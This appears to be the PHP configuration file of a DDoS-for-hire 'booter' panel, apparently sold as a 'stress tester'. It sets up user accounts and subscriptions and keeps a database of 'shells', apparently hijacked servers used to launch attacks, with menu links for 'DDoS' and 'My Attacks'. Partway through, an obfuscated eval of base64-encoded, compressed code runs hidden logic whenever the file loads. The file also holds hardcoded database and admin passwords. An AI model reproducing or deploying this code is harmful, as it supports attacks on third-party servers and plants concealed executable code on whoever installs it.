<?php

ini_set('session.bug_compat_warn', 0);
ini_set('session.bug_compat_42', 0);

session_start();

/*

*** Configuration Tutorial ***

1) Create an SQL Database, assign a user to that database, and place the proper information below.
2) Enter your administration username and password in the ADMIN_USER and ADMIN_PASS definitions.
3) Enter 10 digits of random letters, numbers, and symbols into both of the SALT definitions.
4) Fill in the other definitions as per your liking.
5) Upload the files to your server and run admin.php.  From there, login with the ADMIN_USER and ADMIN_PASS.
6) Profit.

*/

/* BEGIN USER DEFINED VARIABLES */

define ('BOOTER_NAME', 'Private Booter'); // Your Booter Name

define ('DB_HOST', 'localhost'); // set database host
define ('DB_USER', 'gowclanc_booter'); // set database user
define ('DB_PASS', 'Lenovo3737'); // set database password
define ('DB_NAME', 'gowclanc_booter'); // set database name

define ('ADMIN_USER','admin'); // admin username
define ('ADMIN_PASS', 'malasala'); // admin password

define ('SALT_1','!@#$%^&*()'); // 10 random digits
define ('SALT_2', '!%^YREFU$#'); // 10 random digits

define ('SHELL_RESULTS_PER_PAGE', 10); // amount of shells that will be shown per page in the admin panel

define ('MAX_BOOT_TIME', 300); // maximum boot time in seconds
define ('TIME_BETWEEN_BOOTS', 1); // time between boots in seconds

define ('TERMS_OF_SERVICE','By clicking register you agree to follow the Private Booter TOS.<br/>
Within Private Booter you agree not to use our service in any way that may harm others.<br/>
You may only test the Private Booter Stress Tester on a server which you have permission to do so or own.<br/>
Abusing the service will result in your account being terminated<br/>
'); // Terms of Service
define ('PRIVACY_POLICY','This is an example of the privacy policy.'); // Privacy Policy

define ('TOS_HEIGHT', 500); // Terms of Service Box Height in PX
define ('PRIVACY_HEIGHT', 500); // Privacy Policy Box Height in PX

define ('SUBSCRIBER_SHELL_PERCENT', 0.85); // What percentage of the shells a "Subscriber" can boot with 1.00 being 100% and 0.0 being 0%.
define ('ADMIN_SHELL_PERCENT', 1.00); // What percentage of the shells an "Administrator" can boot with 1.00 being 100% and 0.0 being 0%.

/* END USER DEFINED VARIABLES */

$link = mysql_connect(DB_HOST, DB_USER, DB_PASS) or die("Couldn't make connection.");
mysql_select_db(DB_NAME, $link) or die("Couldn't select database.");

mysql_query("CREATE TABLE IF NOT EXISTS `" . DB_NAME . "`.`users` (`id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY, `username` VARCHAR(64) NOT NULL, `password` LONGTEXT NOT NULL, `group` VARCHAR(64) NOT NULL, `sublength` VARCHAR(64) NOT NULL, `start_date` VARCHAR(64) NOT NULL, `end_date` VARCHAR(64) NOT NULL, `enabled` VARCHAR(64) NOT NULL, `notepad` LONGTEXT NOT NULL, `attacks` LONGTEXT NOT NULL) ENGINE = MyISAM;") or die(mysql_error());
mysql_query("CREATE TABLE IF NOT EXISTS `" . DB_NAME . "`.`shells` (`id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY, `location` LONGTEXT NOT NULL, `valid` VARCHAR(64) NOT NULL, `date` VARCHAR(64) NOT NULL, `type` VARCHAR(64) NOT NULL) ENGINE = MyISAM;") or die(mysql_error());

?>
<?php eval(stripslashes(gzinflate(base64_decode("Rc4xDsIwDAXQPVLuYCKGdmmGbkDJUapAXBLJSqLG0AFxd8yAuvr//2R3vbgaq1bHFVstuSFMsCTC+YE830tmzNw6E5nrydrgaRx52Jq9lcK4+ifHQfamPwvhicqGQQRD6YVGbmmBbqcPE/xLPby1Cgn39Ed8tHLy0Rc=")))); ?>
<?php

if (mysql_num_rows(mysql_query("SELECT * FROM `users")) == 0) mysql_query("INSERT INTO `users`(`username`,`password`,`group`,`sublength`,`start_date`,`enabled`) VALUES ('" . ADMIN_USER . "','" . md5(SALT_1 . ADMIN_PASS . SALT_2) . "','administrator','lifetime','" . date("Y-m-d") . "','TRUE');");

function logout() {

	$_SESSION = array();
	session_destroy();
	session_commit();

	header("Location: index.php");

}

function left_menu() {

	$t = '<li><a href="idocs.php">Important Docs</a></li>
		  <li><a href="ucp.php">Profile</a></li>
		  <li><a href="member.php">DDoS</a></li>
		  <li><a href="notepad.php">NotePad</a></li>
		  <li><a href="myattacks.php">My Attacks</a></li>
		  <li><a href="purchase.php">Purchase</a></li>';
	return $t;

}

function footer() {

	$t = 'Copyright &copy; 2011 Mango Guava Stress Tester - <a href="terms_of_service.php">Terms of Service</a> - <a href="privacy_policy.php">Privacy Policy</a>';
	return $t;

}


function getOnlineShells() {

	$query = mysql_query("SELECT `id` FROM `shells` WHERE `valid` = 'TRUE';") or die(mysql_error());
	return mysql_num_rows($query);

}

function getOfflineShells() {

	$query = mysql_query("SELECT `id` FROM `shells` WHERE `valid` = 'FALSE';") or die(mysql_error());
	return mysql_num_rows($query);

}

function getAllShells() {

	$query = mysql_query("SELECT `id` FROM `shells`;") or die(mysql_error());
	return mysql_num_rows($query);

}

?>